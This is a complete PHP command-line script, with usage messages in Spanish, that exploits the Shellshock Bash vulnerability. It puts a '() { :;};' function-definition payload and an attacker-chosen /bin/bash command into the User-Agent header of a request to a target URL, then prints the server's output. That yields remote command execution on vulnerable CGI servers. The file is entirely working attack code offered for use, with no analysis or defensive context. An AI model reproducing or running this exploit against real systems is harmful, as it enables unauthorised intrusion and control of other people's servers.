<?php
if(!empty($argv))
{
	if(!empty($argv[1]) AND !empty($argv[2]))
	{
		$url = "$argv[1]";
		$bug = '() { :;}; ';
		$shell = " /bin/bash -c 'echo \"Content-type: text/plain\"; echo; echo; $argv[2] '";
		$handler = curl_init(); 
		curl_setopt($handler, CURLOPT_URL, $url);
		curl_setopt($handler, CURLOPT_USERAGENT, $bug.$shell);
		$response = curl_exec ($handler);  
		curl_close($handler); 
		echo $response;
	}
	else
	{
		echo "\nBienvenido\n";
		echo "por favor recuerda ejecutar el script de esta forma\n";
		echo "\nphp shellshock.php [UrlSitioWeb] [Comando]\n\n";
	}
}
else
{
	echo "\nBienvenido\n";
	echo "por favor recuerda ejecutar el script de esta forma\n";
	echo "\nphp shellshock.php [UrlSitioWeb] [Comando]\n\n";
}
?>
